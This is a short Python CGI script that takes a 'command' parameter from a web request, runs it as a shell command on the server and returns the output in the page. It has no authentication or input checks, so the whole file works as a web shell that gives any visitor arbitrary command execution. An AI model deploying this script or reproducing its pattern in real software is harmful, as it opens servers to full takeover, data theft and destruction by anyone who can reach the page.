#!/usr/bin/python3

print("content-type:text/html")
print("\n")

import subprocess
import cgi

input = cgi.FieldStorage()
a = input.getvalue("command")
b = subprocess.getoutput(a)

print(a)
print(b)
